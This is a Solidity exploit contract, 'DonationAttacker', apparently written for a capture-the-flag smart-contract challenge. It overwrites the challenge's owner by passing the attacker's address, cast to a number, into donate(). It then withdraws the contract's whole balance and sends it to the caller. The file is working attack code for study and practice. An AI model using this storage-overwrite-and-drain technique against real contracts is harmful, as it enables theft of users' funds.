// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IDonationChallenge{

    function donate(uint256 etherAmount) external payable;
    function withdraw() external;
    function isComplete() external view returns (bool);

}

contract DonationAttacker {

    IDonationChallenge levelInstance;
    uint256 public constant SCALE = 10**18 * 1 ether;

    constructor(address _level){
        levelInstance = IDonationChallenge(_level);
    }

    function castAddress(address _address) public pure returns(uint256){
        return uint256(uint160(_address));
    }

    function calculateMsgValue(uint256 _castedAddress) public pure returns(uint256){
        return _castedAddress / SCALE ; // In wei
    }

    function attackDonation(address _newOwner) external payable {
        uint256 castedAddress = castAddress(_newOwner);
        require(msg.value == castedAddress / SCALE);

        levelInstance.donate{value: msg.value}(castedAddress);

        levelInstance.withdraw();
        require(levelInstance.isComplete(), "!Completed"); 

        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "!success");
    }

    receive() external payable {}

}